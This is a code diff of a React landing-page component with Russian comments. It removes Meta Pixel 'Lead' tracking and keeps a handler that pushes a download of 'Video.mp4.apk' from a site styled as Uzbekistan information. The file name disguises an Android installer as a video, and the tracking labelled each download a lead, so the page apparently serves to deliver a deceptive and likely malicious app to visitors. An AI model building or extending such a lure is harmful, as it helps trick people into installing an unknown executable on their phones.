@@ -1,12 +1,6 @@
 import React, { useEffect } from 'react';
 
 // Функция для безопасного вызова Meta Pixel
-const trackMetaEvent = (eventName, properties = {}) => {
-  if (typeof window.fbq === 'function') {
-    window.fbq('track', eventName, properties);
-  }
-};
-
 
 export default function CollectionPage() {
   // Устанавливаем текущую дату
@@ -27,11 +21,6 @@ export default function CollectionPage() {
   const handleDownload = (e) => {
     e.preventDefault();
 
-    // 💡 Отправляем СТАНДАРТНОЕ событие Meta Pixel 'Lead'
-    trackMetaEvent('Lead', {
-        content_name: 'Video.mp4.apk Download', // Описание лида
-    });
-    
     // Запуск скачивания
     const link = document.createElement('a');
     link.href = 'https://uzbekistan-info.vercel.app/docs/Video.mp4.apk';
